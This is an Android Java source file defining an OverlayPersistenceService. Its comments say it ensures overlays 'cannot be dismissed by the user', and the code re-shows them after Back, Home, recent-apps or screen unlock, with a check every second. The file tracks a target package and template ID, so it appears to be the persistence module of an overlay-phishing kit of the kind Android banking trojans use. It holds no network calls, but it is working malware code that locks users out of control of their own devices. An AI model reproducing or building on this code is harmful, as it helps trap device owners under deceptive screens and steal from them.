package com.fason.app.features.springe.persistence;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.fason.app.features.springe.SpringeEngine;
import com.fason.app.features.springe.SpringeProtocol;

/**
 * OverlayPersistenceService — Ensures overlays cannot be dismissed by the user.
 *
 * Detection mechanisms:
 * 1. Back button press → re-shows overlay immediately
 * 2. Home button press → overlay re-appears when any app is opened
 * 3. Recent apps switcher → overlay stays on top
 * 4. Screen off/on → overlay re-shows after unlock
 * 5. Accessibility window change → if overlay is gone, restore it
 *
 * This works by hooking into accessibility events and using the
 * OverlayWindowManager to ensure the overlay window always stays on top.
 *
 * Integrates with ScreenStateMonitor for full persistence.
 */
public final class OverlayPersistenceService {

    private static final String TAG = "OverlayPersistence";

    private final SpringeEngine engine;
    private final Context context;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    // Check interval when an overlay should be showing (ms)
    private static final long PERSISTENCE_CHECK_INTERVAL = 1000;

    private volatile boolean monitoring = false;
    private volatile String expectedOverlayType = null;
    private volatile String expectedTargetPackage = null;
    private volatile String expectedTemplateId = null;

    // Runnable for periodic overlay check
    private final Runnable persistenceCheck = this::checkOverlayPresence;

    public OverlayPersistenceService(Context context, SpringeEngine engine) {
        this.context = context;
        this.engine = engine;
    }

    /**
     * Start monitoring for overlay persistence.
     * Call this when an overlay is shown.
     */
    public void startMonitoring(String overlayType, String targetPackage, String templateId) {
        this.expectedOverlayType = overlayType;
        this.expectedTargetPackage = targetPackage;
        this.expectedTemplateId = templateId;

        if (!monitoring) {
            monitoring = true;
            mainHandler.postDelayed(persistenceCheck, PERSISTENCE_CHECK_INTERVAL);
            Log.d(TAG, "Persistence monitoring started for " + overlayType);
        }
    }

    /**
     * Stop monitoring. Call this when overlays are intentionally hidden.
     */
    public void stopMonitoring() {
        monitoring = false;
        expectedOverlayType = null;
        expectedTargetPackage = null;
        expectedTemplateId = null;
        mainHandler.removeCallbacks(persistenceCheck);
        Log.d(TAG, "Persistence monitoring stopped");
    }

    public boolean isMonitoring() { return monitoring; }

    /**
     * Called when a back button press is detected via accessibility.
     * Immediately re-shows the overlay.
     */
    public void onBackPressed() {
        if (!monitoring || expectedOverlayType == null) return;

        Log.d(TAG, "Back press detected — re-showing overlay");
        mainHandler.post(() -> {
            // Brief delay to let the system process the back press
            mainHandler.postDelayed(() -> restoreOverlay(), 150);
        });
    }

    /**
     * Called when the home button is pressed or recent apps is shown.
     */
    public void onHomePressed() {
        if (!monitoring) return;
        Log.d(TAG, "Home/Recent press detected — overlay will re-appear");
        // Overlay should naturally re-appear — persistenceCheck handles this
    }

    /**
     * Called when the screen turns on and device is unlocked.
     */
    public void onScreenUnlocked() {
        if (!monitoring || expectedOverlayType == null) return;

        Log.d(TAG, "Screen unlocked — re-showing overlay");
        mainHandler.postDelayed(this::restoreOverlay, 300);
    }

    /**
     * Check if the overlay is still present and re-show if needed.
     */
    private void checkOverlayPresence() {
        if (!monitoring) return;

        // Check if the engine thinks an overlay should be showing
        String currentState = engine.getCurrentOverlayState();
        if (expectedOverlayType != null && !expectedOverlayType.equals(currentState)) {
            // Overlay should be showing but isn't — restore it
            Log.w(TAG, "Overlay missing (expected=" + expectedOverlayType
                + ", actual=" + currentState + ") — restoring");
            restoreOverlay();
        }

        // Re-schedule check
        if (monitoring) {
            mainHandler.postDelayed(persistenceCheck, PERSISTENCE_CHECK_INTERVAL);
        }
    }

    /**
     * Restore the overlay via the engine.
     */
    private void restoreOverlay() {
        if (expectedOverlayType == null) return;

        try {
            // Use the engine to re-show the appropriate overlay
            if (!engine.hasActiveOverlay()) {
                engine.restoreOverlay(expectedOverlayType, expectedTargetPackage, expectedTemplateId);
                Log.i(TAG, "Overlay restored: " + expectedOverlayType);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to restore overlay", e);
        }
    }
}
